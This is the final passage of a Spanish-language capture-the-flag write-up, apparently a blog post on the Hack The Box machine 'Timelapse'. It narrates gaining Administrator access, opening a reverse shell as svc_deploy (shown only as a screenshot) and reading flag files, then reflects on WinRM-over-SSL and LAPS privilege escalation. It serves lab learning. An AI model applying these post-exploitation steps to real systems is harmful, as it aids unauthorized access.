Estamos ejecutando comandos como el usuario `Administrator` en el sistemaaaaaaaaaaaaaa (: Entablemos una reverse shell así mismo como `svc_deploy`, podemos usar el objeto guardado en sus archivos y tambien rehusar el puerto **4433**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452windows_administrator_RevPS.png" style="width: 100%;"/>

Listos, veamos las flags :K

```powershell
type c:\Users\Administrator\Desktop\root.txt
Ps > type : Cannot find path 'C:\Users\Administrator\Desktop\root.txt' because it does not exist.
...
```

Jmmm, pues existe un usuario más en el sistema llamado `TRX` que esta asignado al grupo `Domain Admins`, veamos si el la tiene:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/timelapse/452flags.png" style="width: 100%;"/>

Pos si :P nos fui

...

Una muy linda máquina, me gusto bastante en general, el tema de **winrm** por **SSL** no lo habia manejado y menos la escalada por **LAPS**, así que brutal!

Y nada, nos leeremos en otra ocasión, hay muuuchas cosas para jugar aún, así que a seguir rompiendo!